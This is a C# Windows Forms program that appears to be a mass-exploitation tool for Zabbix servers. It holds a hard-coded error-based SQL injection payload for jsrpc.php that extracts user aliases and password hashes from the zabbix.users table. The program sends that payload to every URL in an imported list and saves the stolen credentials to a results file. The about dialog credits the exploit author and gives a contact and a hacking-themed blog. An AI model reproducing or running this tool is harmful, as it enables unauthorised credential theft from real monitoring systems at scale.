using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Web;
using System.Threading;

namespace Zabbix
{
    public partial class frmMian : Form
    {
       public int i = 1;
       public int j = 0;
        // public static List<UrlE> list1 = new List<UrlE>();
        public frmMian()
        {
            InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;//加上这句就不会警告了
        }
        //exp
        public static string exp = "jsrpc.php?type=9&method=screen.get&tamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1 AND (SELECT 1231 FROM(SELECT COUNT(*),CONCAT(0x716a717a71,(SELECT MID((IFNULL(CAST(concat(alias,0x7e,passwd,0x7e) AS CHAR),0x20)),1,54) FROM zabbix.users ORDER BY name LIMIT 1,1),0x717a6b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17";
        /// <summary>
        /// url导入按钮
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void tsmiIn_Click(object sender, EventArgs e)
        {
            lvList.Items.Clear();
            lvOut.Items.Clear();
            ofdRead.Filter = "txt文件|*.txt";//过滤格式
            if (ofdRead.ShowDialog() == DialogResult.OK) {
                //获取文件路径
                string path = ofdRead.FileName;
                //创建文件流
                FileStream fs = null;
                //创建读取器
                StreamReader sr = null;
                try
                {
                    //创建文件流
                    fs = new FileStream(path, FileMode.Open);
                    //创建读取器
                    sr = new StreamReader(fs, Encoding.UTF8);
                    String strTmpl = "";
                    if (strTmpl == null) {
                        MessageBox.Show("请导入有效url");
                        return;
                    }
                    while (strTmpl != null)
                    {
                        strTmpl = sr.ReadLine();
                        if (strTmpl != null && !strTmpl.Equals(""))
                        {
                            lvList.Items.Add(strTmpl);
                        }
                    }
                    MessageBox.Show("导入成功!");
                    tsmiStart.Enabled = true;
                }
                catch (Exception)
                {
                    MessageBox.Show("程序异常,请联系QQ758841765");
                }
                finally {
                    sr.Close();
                    fs.Close();
                }
            }
        }
        /// <summary>
        /// 开始按钮
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void tsmiStart_Click(object sender, EventArgs e)
        {
            lvOut.Items.Clear();
            List<String> list = new List<string>();
            int count = lvList.Items.Count;
            for (int i = 0; i < count; i++)
            {
                list.Add(lvList.Items[i].Text.Trim().ToString());
            }
            j = list.Count;
            string url = "";
            for (int i = 0; i < list.Count; i++)
            {
                url = list[i];
                ThreadPool.QueueUserWorkItem(Start, url);
            }
        }
        /// <summary>
        /// 导出按钮
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void tsmiOut_Click(object sender, EventArgs e)
        {
            FileStream fs = null;
            StreamWriter sw = null;
            try
            {
                //创建文件流
                fs = new FileStream("result.txt", FileMode.Create);
                //创建写入器
                sw = new StreamWriter(fs);
                for (int i = 0; i < lvOut.Items.Count; i++)
                {
                    sw.WriteLine(lvOut.Items[i].Text.ToString());
                }
            }
            catch (Exception)
            {
                throw;
            }
            finally {
                sw.Close();//关闭写入器
                fs.Close();//关闭文件流
            }
            MessageBox.Show("写入成功！");
        }
        /// <summary>
        /// 写文件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void frmMian_FormClosing(object sender, FormClosingEventArgs e)
        {
            FileStream fs = null;
            StreamWriter sw = null;
            try
            {
                //创建文件流
                fs = new FileStream("result.txt", FileMode.OpenOrCreate);
                //创建写入器
                sw = new StreamWriter(fs);
                for (int i = 0; i < lvOut.Items.Count; i++)
                {
                    sw.WriteLine(lvOut.Items[i].Text.ToString());
                }
            }
            catch (Exception)
            {
                throw;
            }
            finally
            {
                sw.Close();//关闭写入器
                fs.Close();//关闭文件流
            }
        }
        /// <summary>
        /// 关于我们
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void tsmiAbout_Click(object sender, EventArgs e)
        {
            MessageBox.Show("EXP提供：霸总\n0nise开发\nQQ:758841765\n博客:www.hack-gov.com");
        }
        /// <summary>
        /// 内容处理
        /// </summary>
        /// <param name="str"></param>
        /// <returns></returns>
        private static string[] StrTmpl(string str)
        {
            string[] arr = new string[2];
            int i  = str.IndexOf("'");
            str = str.Substring(i+1);
            int j = str.IndexOf("'");
            str = str.Substring(0,j);
            int x = str.IndexOf("~");
            int xx = str.LastIndexOf("~");
            arr[0] = str.Substring(0,x);
            arr[1] = str.Substring(x+1,xx-x-1);
            return arr;
        }
        public void Start(object data)
        {
            string url = data as string;
            if (url.IndexOf("http") == -1)
            {
                url = "http://" + url;
            }
            UrlE URL = new UrlE();
            XJHTTP helpers = new XJHTTP();
            CookieContainer cc = new CookieContainer();
            HttpResults hr = helpers.GetHtml(url + exp, cc);
            if (hr.Html.Length != 0)
            {
                string tmp = helpers.GetStringMid(hr.Html, "[Duplicate entry", "]");
                if (tmp.Length != 0)
                {
                    string[] arr = StrTmpl(tmp);
                    lvOut.Items.Add(url + "  "+arr[0]+"  "+arr[1]);
                }
                else
                {
                    lvOut.Items.Add(url+"  漏洞不存在");
                }
            }
            else
            {
                lvOut.Items.Add(url + "  漏洞不存在");
            }
            labText.Text = j + "/" + i;
            i++;
            if (i == j)
            {
                MessageBox.Show("检测完成!");
                tsmiOut.Enabled = true;
            }
        }
    }
    public class UrlE {
        public string url { get; set; }
        public string result { get; set; }
    }
}
